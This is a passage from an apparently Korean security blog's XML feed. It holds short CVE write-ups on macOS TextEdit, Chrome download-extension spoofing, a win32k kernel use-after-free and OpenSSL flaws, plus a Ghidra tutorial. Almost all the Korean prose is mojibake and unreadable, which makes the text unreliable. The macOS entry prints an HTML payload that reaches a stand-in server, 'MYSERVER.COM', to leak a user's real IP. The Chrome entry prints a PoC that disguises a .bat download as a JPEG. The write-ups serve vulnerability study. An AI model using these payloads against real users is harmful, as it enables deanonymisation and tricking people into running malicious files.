      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>zero click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2019-8761: MacOS txt íŒŒì¼ë¡œ html ì‹¤í–‰</title>
    <link href="/2021/04/04/insu/2021-04-04/"/>
    <url>/2021/04/04/insu/2021-04-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html">THIS MAN THOUGHT OPENING A TXT FILE IS FINE, HE THOUGHT WRONG. MACOS CVE-2019-8761</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOSì—ì„œ TextEditë¥¼ í†µí•´ í™•ì¥ìëª…ì´ txtì„ì—ë„ ë¶ˆêµ¬í•˜ê³  RTF-HTML íŒŒì¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ë§Œì•½ txt íŒŒì¼ì´ ë‹¤ìŒê³¼ ê°™ì´ ì‹œì‘í•˜ë©´, txt íŒŒì¼ì„ì—ë„ HTML íŒŒì‹±ì„ í•©ë‹ˆë‹¤.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre><p>ë‹¤ìŒê³¼ ê°™ì€ CSS ì†ì„±ì´ ë¡œì»¬ CSS íŒŒì¼ì„ ë¡œë“œí•©ë‹ˆë‹¤.</p><pre><code class="hljs python">&lt;style&gt; @import &#123; &quot;url &quot; &#125; &lt;/stymle&gt;</code></pre><p>í•˜ì§€ë§Œ ì‘ë™í•˜ëŠ” schemeì€ <code>file://</code>ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì™¸ë¶€ ìš”ì²­ì€ í•  ìˆ˜ ì—†ì§€ë§Œ ë¡œì»¬ì— ì €ì¥ëœ ë‹¤ë¥¸ ë¡œì»¬ íŒŒì¼ì„  ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  OSXì˜ AutoMount ê¸°ëŠ¥ì„ í†µí•´ ì›ê²© ìš”ì²­ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>ls /net/EXAMPLE.com</code>ì„ ìˆ˜í–‰í•˜ë©´ OSXê°€ <code>EXAMPLE.com</code>ì— ì›ê²© ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤. TextEditì—ì„œ ì™¸ë¶€ ìš”ì²­ì„ ëª»í•˜ë„ë¡ ì°¨ë‹¨í•˜ì˜€ì§€ë§Œ <code>file://</code> schemeë¥¼ í†µí•´ <code>MYSERVER.COM</code>ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>MYSERVER.COM</code>ì— ì ‘ê·¼í•˜ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import&#123; &quot;file:///net/MYSERVER.COM/a.css&quot;&#125; &lt;/style&gt;I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre><p>AutoMountëŠ” ì»¤ë„ì„ ì‚¬ìš©í•˜ì—¬ TCP ì—°ê²°ì„ í•˜ë¯€ë¡œ í”„ë¡ì‹œë¥¼ ì‚¬ìš©í•˜ë”ë¼ë„ ì‹¤ì œ IP ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>insu</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 3 - A few tips for IDA User</title>
    <link href="/2021/04/04/idioth/ghidra_part3/"/>
    <url>/2021/04/04/idioth/ghidra_part3/</url>
    
    <content type="html"><![CDATA[<p><strong>ë‹¤ë¥¸ íŒŒíŠ¸ ë³´ëŸ¬ê°€ê¸°</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 2 - Data, Functions, Scripts</a></p><p>Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 3 - tips for IDA User (Here!)</p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 4 - Malware Analysis (1)</a></p><hr><p>ì•ˆë…•í•˜ì„¸ìš”! ì˜¤ëœë§Œì— ì°¾ì•„ëµ™ìŠµë‹ˆë‹¤. ê°‘ìê¸° ë‚ ì”¨ê°€ ì—„ì²­ë‚˜ê²Œ ë”ì›Œì¡ŒìŠµë‹ˆë‹¤. ë´„ ì˜·ì„ êº¼ë‚¼ ê²¨ë¥¼ë„ ì—†ì´ ê°‘ìê¸° ì—¬ë¦„ì´ ì°¾ì•„ì˜¨ ê²ƒë§Œ ê°™ì€ ëŠë‚Œì…ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled.png"></p><p>ì¼êµì°¨ëŠ” ë˜ ì—„ì²­ ì»¤ì„œ ë°¤ì„ ìƒê°í•˜ê³  ì˜·ì„ ì…ìœ¼ë©´ ë‚®ì—ëŠ” ë¶ˆíƒ€ëŠ” ì‚¶ì„ ì‚´ê³  ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ BMWê°€ ë„ˆë¬´ ë¥ìŠµë‹ˆë‹¤. Busì™€ MetroëŠ” ì‚¬ëŒë“¤ì˜ ì—´ê¸°ë¡œ í›„ëˆí›„ëˆí•˜ê³ â€¦ ì´ ë‚ ì”¨ì— Walkë¥¼ í•˜ë©´ ë§ˆìŠ¤í¬ì—ë„ ë•€ì´ ì°¨ëŠ”â€¦</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%201.png"></p><p>ë‚ ì”¨ë„ ë¥ê³  í”¼ê³¤í•˜ë‹ˆ ì‹œì›í•œ ì•„ë©”ë¦¬ì¹´ë…¸ í•œ ì” ë§ˆì‹œë©´ì„œ ì˜¤ëŠ˜ì˜ ì£¼ì œì¸ IDA ì‚¬ìš©ìë¥¼ ìœ„í•œ ghidra íŒ! ì„ ì‹œì‘í•´ë³´ê² ìŠµë‹ˆë‹¤!</p><h1 id="API-call-parameter-ìë™-ì½”ë©˜íŠ¸"><a href="#API-call-parameter-ìë™-ì½”ë©˜íŠ¸" class="headerlink" title="API call parameter ìë™ ì½”ë©˜íŠ¸"></a>API call parameter ìë™ ì½”ë©˜íŠ¸</h1><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%202.png"></p><p>IDAì˜ ê²½ìš° ìœ„ì™€ ê°™ì´ Windows APIê°€ í˜¸ì¶œë  ê²½ìš°, ê° íŒŒë¼ë¯¸í„°ì˜ ì´ë¦„ì„ ì½”ë©˜íŠ¸ë¡œ ë‹¬ì•„ì¤ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%203.png"></p><p>í•˜ì§€ë§Œ analysisë¥¼ í•  ë•Œ ê¸°ë³¸ ì„¤ì •ìœ¼ë¡œ ì§„í–‰ì„ í•œë‹¤ë©´ ghidraëŠ” ì½”ë©˜íŠ¸ë¥¼ ë‹¬ì•„ì£¼ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¬¼ë¡  <code>memset</code>ì´ë¼ ì íŒ ë¶€ë¶„ì— ìˆëŠ” ì½”ë©˜íŠ¸ë¥¼ ë³´ë©´ ì–´ë– í•œ íŒŒë¼ë¯¸í„° ì´ë¦„ì´ ìˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆê³  ê·¸ê±°ì— ë”°ë¼ì„œ ë§¤ì¹˜ë¥¼ í•˜ë©´ ë˜ê¸´ í•©ë‹ˆë‹¤ë§Œâ€¦ í•œ ë²ˆ ë” ìƒê°ì„ í•´ì•¼ í•˜ë‹ˆ ì¢€ ë¶ˆí¸í•˜ì£ .</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%204.png"></p><p>analysis optionì—ì„œ WindowsPE x86 Propagate External Parameters ì˜µì…˜ì„ ì²´í¬í•œ í›„ Analyzeë¥¼ ì§„í–‰í•˜ë©´..?</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%205.png"></p><p>ì–´ë–¤ í•¨ìˆ˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” íŒŒë¼ë¯¸í„°ì¸ì§€, íŒŒë¼ë¯¸í„°ì˜ ìë£Œí˜•ê³¼ ì´ë¦„ê¹Œì§€ ëª¨ë‘ ì½”ë©˜íŠ¸ë¡œ ì‘ì„±ë©ë‹ˆë‹¤!</p><p>í˜¹ì‹œ.. ì˜µì…˜ì„ ì„¤ì •í•˜ëŠ” ê±¸ ê¹Œë¨¹ê³  Analyzeë¥¼ ì§„í–‰ì„ í•˜ì…¨ë‹¤ë©´ êµ³ì´ ê»ë‹¤ í‚¬ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%206.png"></p><p>Analysis - One Shot - WindowsPE x86 Propagate External Parametersë¥¼ í†µí•´ì„œ ì§„í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%207.png"></p><h1 id="flag-constant-ì„¤ì •"><a href="#flag-constant-ì„¤ì •" class="headerlink" title="flag constant ì„¤ì •"></a>flag constant ì„¤ì •</h1><p>ì•…ì„±ì½”ë“œ ë¶„ì„ ë“±ì„ í•˜ë‹¤ ë³´ë©´ <code>CreateFileA()</code> ë“±ì˜ APIë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ê°€ ë§ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ëŸ¬í•œ APIë“¤ì€ flag ê°’ì— <code>0x00000004</code>ì´ <code>FILE_SHARE_DELETE</code>ë¼ë˜ì§€ì˜ constantë¥¼ ê°–ëŠ” ê²½ìš°ê°€ ë§ì´ ìˆì£ .</p><p>IDAì—ì„œëŠ” í•´ë‹¹í•˜ëŠ” ê°’ì„ ìš°í´ë¦­í•˜ì—¬ â€˜Use standard symbolic constantâ€™ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°’ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%208.png"></p><p><code>CreateProcessA</code>ì˜ <code>0x80000000</code> í”Œë˜ê·¸ ê°’ì€ <code>CREATE_NO_WINDOW</code>ì˜ ê°’ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ ì„ íƒí•˜ì—¬ ì„¤ì •í•˜ë©´</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%209.png"></p><p>ì´ëŸ° ì‹ìœ¼ë¡œ í‘œì‹œê°€ ë©ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2010.png"></p><p>ghidraì—ì„œ í™•ì¸í•œ ë˜‘ê°™ì€ ë¶€ë¶„ì…ë‹ˆë‹¤. <code>0x80000000</code> ë¶€ë¶„ì„ ë˜‘ê°™ì´ <code>CREATE_NO_WINODW</code>ë¡œ í‘œì‹œí•  ìˆ˜ ìˆëŠ” ë°©ë²•ì€ ë˜‘ê°™ìŠµë‹ˆë‹¤. í•´ë‹¹ ë¶€ë¶„ì„ ìš°í´ë¦­í•˜ê³  â€˜Set Equation(ë‹¨ì¶•í‚¤ E)â€™ë¥¼ ëˆ„ë¦…ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2011.png"></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2012.png"></p><p>í•´ë‹¹ ì°½ì„ í™•ì¸í•˜ì‹œë©´ ì—¬ëŸ¬ ê°€ì§€ ê°’ë“¤ì´ ëœ¹ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2013.png"></p><p>IDAì—ì„œ ëœ¨ëŠ” ì°½ê³¼ ë¹„êµí•´ ë´¤ì„ ë•Œ, í° ì°¨ì´ê°€ ì—†ì£ ? ì´ì œ ì €ê¸°ì„œ <code>CREATE_NO_WINDOW</code>ë¥¼ ì„ íƒí•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2014.png"></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2015.png"></p><p><code>0x80000000</code>ì´ ëª¨ë‘ <code>CREATE_NO_WINDOW</code>ë¡œ ë°”ë€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><h1 id="ë¶„ëŸ‰-ì¡°ì ˆ-ì‹¤íŒ¨"><a href="#ë¶„ëŸ‰-ì¡°ì ˆ-ì‹¤íŒ¨" class="headerlink" title="ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨!"></a>ë¶„ëŸ‰ ì¡°ì ˆ ì‹¤íŒ¨!</h1><p>ì˜ˆìƒì¹˜ ëª»í•˜ê²Œ ë¶„ëŸ‰ ì¡°ì ˆì„ ì‹¤íŒ¨í•´ë²„ë ¸ìŠµë‹ˆë‹¤! unreachable code ë“±ì˜ ë¶€ë¶„ì€ ê¸°ë³¸ ì„¤ì •ìœ¼ë¡œ ë˜ì–´ ìˆê³ â€¦ (ë¶„ëª… ì˜ˆì „ì—ëŠ” ê¸°ë³¸ ì„¤ì • ì•„ë‹ˆì—ˆë˜ ê²ƒ ê°™ì€ë° ì—…ë°ì´íŠ¸í•˜ë©´ì„œ ë°”ë€Œì—ˆë‚˜â€¦? ã… ã… ) IDAPythonì´ë‚˜ ê·¸ë˜í”„ ë·° ë“±ì€ ì´ì „ íŒŒíŠ¸ì—ì„œ ë‹¤ë£¨ì—ˆì£ .</p><p>ì‚¬ì‹¤ ì´ ë¶€ë¶„ì—ì„œ WinAPIì— ëŒ€í•œ ê²ƒì„ ë‹¤ë£¬ ì´ìœ ëŠ” ë‹¤ìŒ íŒŒíŠ¸ë¥¼ ìœ„í•´ì„œì…ë‹ˆë‹¤â€¦ ê¸‰í•˜ê²Œ ë§ˆë¬´ë¦¬í•˜ëŠ” ê²ƒì´ ì•„ë‹™ë‹ˆë‹¤. Part 4ì—ì„œëŠ” ì•…ì„±ì½”ë“œë¥¼ ghidraë¡œ ë¶„ì„í•´ë³´ë ¤ í•©ë‹ˆë‹¤!</p><p>ì™€! ì•…ì„±ì½”ë“œë¥¼ ë¶„ì„í•˜ë ¤ë©´ API íŒŒë¼ë¯¸í„°ì— ì–´ë–¤ ê²Œ ë“¤ì–´ê°€ëŠ”ì§€ ì•Œì•„ì•¼ í•˜ê³ , flag ê°’ë„ hexë¡œ ë‚˜ì˜¤ëŠ” ê²ƒë³´ë‹¤ constant ì´ë¦„ì„ ì•Œë ¤ì£¼ë©´ ë„ˆë¬´ë‚˜ë„ í¸ë¦¬í•˜ì–ì•„? ë§ì£ ? ê·¸ë ‡ì£ ? â€¦. ë‹¤ìŒì—ëŠ” í’ì¡±í•œ ë¶„ëŸ‰ì˜ ê¸€ì„ ê°€ì ¸ì˜¤ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. í•˜í•˜</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2016.png"></p><p>ë¨¸ë¦¬ë¥¼ ë°•ìœ¼ë©° ë‹¤ìŒ íŒŒíŠ¸ë¥¼ ì¤€ë¹„í•´ì˜¤ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤! ê°ì‚¬í•©ë‹ˆë‹¤!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21123: Chromeì—ì„œ ë°œìƒí•˜ëŠ” í™•ì¥ì spoofing</title>
    <link href="/2021/04/03/fabu1ous/2021-04-03/"/>
    <url>/2021/04/03/fabu1ous/2021-04-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1137247">Issue 1137247: Security: Spoofing download filename extension in 86 chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 88.0.4324.96</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><blockquote><p>CVE-2021-21123:  88.0.4324.96 ì´ì „ Google Chromeì˜ File System APIì—ì„œ ë¶ˆì¶©ë¶„í•œ ë°ì´í„° ìœ íš¨ì„± ê²€ì‚¬ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì¡°ì‘ëœ HTML í˜ì´ì§€ë¥¼ í†µí•´ íŒŒì¼ ì‹œìŠ¤í…œ ì œí•œì„ ë¬´ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p></blockquote><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;addNewFile&#x27;</span>)</span><span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;</span><span class="javascript">            <span class="hljs-keyword">const</span> options = &#123;</span>                types: [                    &#123;                        description:<span class="javascript">                            <span class="hljs-string">&#x27;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &#x27;</span>,</span>                        accept: &#123;<span class="javascript">                            <span class="hljs-string">&#x27;text/plain&#x27;</span>: [<span class="hljs-string">&#x27;.bat&#x27;</span>]</span>                        &#125;,<span class="javascript">                        content: <span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span></span>                    &#125;                ]            &#125;<span class="javascript">            <span class="hljs-keyword">const</span> handle = <span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showSaveFilePicker(options)</span><span class="javascript">            <span class="hljs-keyword">const</span> writable = <span class="hljs-keyword">await</span> handle.createWritable()</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span>)</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.close()</span><span class="javascript">            alert(<span class="hljs-string">&#x27;File saved&#x27;</span>)</span>        &#125;)    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>ìœ„ëŠ” ê³µê°œëœ HTML PoCì˜ ì¼ë¶€ì…ë‹ˆë‹¤. ë³€ìˆ˜  <code>description</code>ì˜ ê°’ì€ Google Chromeì´ í˜¸ì¶œí•˜ëŠ” â€œSave as(ë‹¤ë¥¸ ì´ë¦„ìœ¼ë¡œ ì €ì¥)â€ ì°½ì—ì„œ ë‹¤ìš´ë¡œë“œë  íŒŒì¼ì˜ í™•ì¥ìë¥¼ ì‚¬ìš©ìì—ê²Œ ë³´ì—¬ì£¼ëŠ” ìš©ë„ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. <code>description</code>ì— ì—°ì†ì ì¸ ê³µë°± ë¬¸ì í˜¹ì€ <code>*</code>ì´ í¬í•¨ë˜ì§€ ëª»í•˜ë„ë¡ ë§‰ëŠ” í•„í„°ë§ì˜ ë¶€ì¬ë¡œ ì¸í•´ ë‹¤ìš´ë¡œë“œë  íŒŒì¼ì˜ ì‹¤ì œ í™•ì¥ìë¥¼ ìˆ¨ê¸°ê±°ë‚˜ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤(Spoofing download filename). í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•´ ì›ê²©ìœ¼ë¡œ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì•…ì„± ì½”ë“œë¥¼ ì„¤ì¹˜ ë° ì‹¤í–‰í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— User Interactionì´ í•„ìš”í•¨ì—ë„ ë¶ˆêµ¬í•˜ê³  ë†’ì€ ì‹¬ê°ë„ì˜ ì·¨ì•½ì ìœ¼ë¡œ ë¶„ë¥˜ëìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>spoofing</tag>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26863: race conditionì„ í†µí•œ win32k ì»¤ë„ UAF ì·¨ì•½ì </title>
    <link href="/2021/04/02/l0ch/2021-04-02/"/>
    <url>/2021/04/02/l0ch/2021-04-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2139">Issue 2139: Windows Kernel win32k UAF of the PDEVOBJ object via a race condition in NtGdiGetDeviceCapsAll</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>win32k kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Project ZeroíŒ€ì´ Windows Kernelì—ì„œ ë°œìƒí•˜ëŠ” race conditionì„ í†µí•œ UAF ì·¨ì•½ì ì˜ ì„¸ë¶€ ë³´ê³ ì„œë¥¼ ê³µê°œí–ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” <code>NtGdiGetDeviceCapsAll</code> í•¨ìˆ˜ëŠ” GDIì—ì„œ ë‚´ë¶€ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” system callì…ë‹ˆë‹¤.</p><pre><code class="hljs cpp">...<span class="hljs-function">BOOL <span class="hljs-title">NtGdiGetDeviceCapsAll</span><span class="hljs-params">(HDC hdc, DEVCAPS *devcaps)</span> </span>&#123;BOOL bRet = TRUE;PDEVOBJ *pdevobj;<span class="hljs-keyword">if</span> (PsGetWin32KFilterSet() == <span class="hljs-number">5</span> &amp;&amp; hdc == <span class="hljs-number">0xFFFFFFFFDCDE5000</span>) &#123;pdevobj = gpDispInfo-&gt;pdevobj;<span class="hljs-comment">// DCOBJ scope</span>&#125; <span class="hljs-keyword">else</span> &#123;DCOBJ dc(hdc); <span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> (!dc.valid) &#123;EngSetLastError(ERROR_INVALID_HANDLE);DCOBJ::~DCOBJ(dc);<span class="hljs-keyword">return</span> FALSE;&#125;pdevobj = dc.pdevobj;DCOBJ::~DCOBJ(dc);&#125;<span class="hljs-comment">// DCOBJ scope</span>__try &#123;ProbeForWrite(devcaps, <span class="hljs-keyword">sizeof</span>(DEVCAPS), <span class="hljs-number">1</span>);vGetDeviceCaps(pdevobj, devcaps);  <span class="hljs-comment">//[2]</span>&#125;except(EXCEPTION_EXECUTE_HANDLER) &#123;bRet = FALSE;&#125;<span class="hljs-keyword">return</span> bRet;&#125;...</code></pre><p>í•´ë‹¹ í•¨ìˆ˜ëŠ” <a href="https://docs.microsoft.com/ko-kr/cpp/mfc/device-contexts?view=msvc-160">Device Context(DC)</a> í•¸ë“¤ì„ ì–»ì–´ ì¥ì¹˜ ì •ë³´ë¥¼ <code>DEVCAPS</code> êµ¬ì¡°ì²´ì— ì €ì¥í•˜ëŠ” ê¸°ëŠ¥ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p><code>DCOBJ</code> ê°ì²´ì¸ <code>dc</code>ë¥¼ <code>else</code> ë¬¸ ë‚´ë¶€ì—ì„œ ì„ ì–¸í•´ í•´ë‹¹ ê°ì²´ì˜ scopeê°€ <code>else</code>ë¬¸ìœ¼ë¡œ í•œì •ë©ë‹ˆë‹¤. ë˜í•œ ê°ì²´ê°€ syscall ì „ì²´ì—ì„œ í™œì„±í™”ëœ ìƒíƒœë¥¼ ìœ ì§€í•  ìˆ˜ ìˆëŠ” ë©”ì»¤ë‹ˆì¦˜ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ <code>else</code> ì½”ë“œë¥¼ ë²—ì–´ë‚˜ë©´ <code>DCOBJ::~DCOBJ(dc)</code> ì†Œë©¸ìê°€ ìë™ìœ¼ë¡œ í˜¸ì¶œë˜ì–´ <code>dc</code>ì— ëŒ€í•œ ì°¸ì¡°ê°€ ì‚­ì œë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ <code>dc</code>ë¥¼ ì°¸ì¡°í•˜ëŠ” <code>pdevobj</code> ê°ì²´ê°€ race conditionì˜ ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•´ [1]ì—ì„œ <code>DCOBJ</code>ìƒì„±ìì— ì˜í•´ ì°¸ì¡°ëœ ì´í›„ ë‹¤ë¥¸ ìŠ¤ë ˆë“œê°€ [2]ì—ì„œ <code>vGetDeviceCaps()</code> í˜¸ì¶œ ì „ ë˜ëŠ” ë„ì¤‘ <code>Device Context</code>ë¥¼ ë‹«ëŠ” ê²½ìš° í•´ì œëœ ë©”ëª¨ë¦¬ì— ì•¡ì„¸ìŠ¤ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>race condition</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CA certificate check bypass &amp; NULL pointer deref in OpenSSL</title>
    <link href="/2021/04/01/insu/2021-04-01/"/>
    <url>/2021/04/01/insu/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openssl.org/news/secadv/20210325.txt">OpenSSL Security Advisory [25 March 2021]</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenSSL</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenSSLì—ì„œ CA ì¸ì¦ bypassì™€ Null Pointer Dereference ì·¨ì•½ì (Denial-of-Service)ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p><strong>CA certificate check bypass</strong></p><p>X509_V_FLAG_X509_STRICT flagë¥¼ ì‚¬ìš©í•˜ì—¬ ì¶”ê°€ ë³´ì•ˆ ê²€ì‚¬ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>íƒ€ì› ê³¡ì„  ë³€ìˆ˜ë¥¼ ì¸ì½”ë”©í•œ ì²´ì¸ì˜ ì¸ì¦ì„œë¥¼ í—ˆìš©í•˜ì§€ ì•ŠëŠ” ê²€ì‚¬ê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì´ì´ ê²€ì‚¬ë¥¼ ì§„í–‰í•  ë•Œ, ì¸ì¦ì„œê°€ ìœ íš¨í•œ CA ì¸ì •ì„œì¸ì§€ í™•ì¸í•˜ëŠ” ì´ì „ì˜ ê²€ì‚¬ ê²°ê³¼ë¥¼ ë®ì–´ ì”Œì›Œ ì·¨ì•½ì ì´ ë°œìƒí–ˆìŠµë‹ˆë‹¤.</p><p><strong>Null pointer dereference</strong></p><p>clientì—ì„œ ì¡°ì‘ëœ renegotiation ClientHello messageë¥¼ ë³´ë‚¸ ê²½ìš°, ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>ë§Œì•½ initalizeì—ì„œ TLSv1.2 renegotiation ClientHelloê°€ signature_algorithms extensionì„ ì„¤ì •í•˜ì§€ ì•Šì§€ë§Œ, signature_algorithms_cert extensionì„ í¬í•¨í•œë‹¤ë©´ null pointer deref ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ <a href="https://github.com/terorie/cve-2021-3449">ë§í¬</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>insu</tag>
      
      <tag>openssl</tag>
      
